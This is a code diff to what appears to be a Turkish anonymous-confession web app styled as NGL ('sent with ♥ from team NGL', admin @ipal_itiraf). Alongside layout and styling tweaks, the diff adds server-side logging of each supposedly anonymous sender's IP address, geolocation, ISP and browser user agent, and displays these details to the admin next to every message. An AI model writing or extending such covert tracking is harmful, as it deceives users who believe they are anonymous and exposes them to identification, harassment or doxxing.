@@ -67,7 +67,7 @@ MESAJLAR_HTML = """
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body {
-            background: linear-gradient(135deg, #0f001a, #1a0033, #2a004d, #4b0082);
+            background: linear-gradient(135deg, #0f001a, #1a0033, #2a004d);
             color: white;
             font-family: 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
@@ -86,9 +86,9 @@ MESAJLAR_HTML = """
             width: 90%;
             max-width: 400px;
             min-height: 800px;
-            margin: 20px auto 40px;
+            margin: 20px auto;
             background: linear-gradient(135deg, #ff00cc, #8a2be2, #4b0082);
-            border-radius: 28px;
+            border-radius: 12px; /* keskin köşeler */
             box-shadow: 0 15px 50px rgba(255, 0, 204, 0.4);
             color: white;
             position: relative;
@@ -110,10 +110,23 @@ MESAJLAR_HTML = """
             opacity: 0.5;
             pointer-events: none;
         }
+        .inner-box {
+            background: rgba(0, 0, 0, 0.45);
+            border-radius: 16px;
+            width: 90%;
+            aspect-ratio: 16 / 9;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+            margin-bottom: 40px;
+        }
         .username {
             font-size: 2.4rem;
             font-weight: bold;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
             text-shadow: 0 2px 10px rgba(0,0,0,0.6);
             text-align: center;
         }
@@ -121,11 +134,16 @@ MESAJLAR_HTML = """
             font-size: 1.8rem;
             line-height: 1.6;
             text-align: center;
-            flex-grow: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 0 20px;
+        }
+        .log-details {
+            font-size: 0.9rem;
+            opacity: 0.8;
+            text-align: left;
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 8px;
+            width: 90%;
         }
         .footer {
             font-size: 1.1rem;
@@ -167,8 +185,17 @@ MESAJLAR_HTML = """
         {% if messages %}
             {% for msg in messages %}
                 <div class="story-preview" id="msg-box-{{ loop.index }}">
-                    <div class="username">@{{ msg.username or 'Anonim' }}</div>
-                    <div class="message">{{ msg.message }}</div>
+                    <div class="inner-box">
+                        <div class="username">@{{ msg.username or 'Anonim' }}</div>
+                        <div class="message">{{ msg.message }}</div>
+                    </div>
+                    <div class="log-details">
+                        <strong>IP:</strong> {{ msg.ip or 'Bilinmiyor' }} <br>
+                        <strong>Konum:</strong> {{ msg.location or 'Bilinmiyor' }} <br>
+                        <strong>ISP:</strong> {{ msg.isp or 'Bilinmiyor' }} <br>
+                        <strong>Cihaz:</strong> {{ msg.user_agent[:80] or 'Bilinmiyor' }}... <br>
+                        <strong>Zaman:</strong> {{ msg.timestamp }}
+                    </div>
                     <div class="footer">sent with ♥ from team NGL</div>
                     <div class="admin-footer">@ipal_itiraf</div>
                     <button class="download-btn" onclick="downloadBox('msg-box-{{ loop.index }}')">Story'ye Kaydet (İndir)</button>
@@ -188,8 +215,8 @@ MESAJLAR_HTML = """
             }
 
             html2canvas(box, {
-                scale: 4, // yüksek netlik (Story için ideal)
-                backgroundColor: null, // beyaz kenar yok, şeffaf arka plan
+                scale: 4,
+                backgroundColor: null,
                 useCORS: true,
                 logging: false,
                 windowWidth: box.scrollWidth,
@@ -204,7 +231,7 @@ MESAJLAR_HTML = """
                     btn.style.display = 'block';
                 }
             }).catch(err => {
-                alert("Resim oluşturulamadı, uzun bas kaydetmeyi dene: " + err);
+                alert("Resim oluşturulamadı: " + err);
                 for (let btn of buttons) {
                     btn.style.display = 'block';
                 }
@@ -258,6 +285,10 @@ def home():
             messages.append({
                 "username": username or 'Anonim',
                 "message": msg,
+                "ip": client_ip,
+                "location": location,
+                "isp": isp,
+                "user_agent": user_agent,
                 "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
             })
 
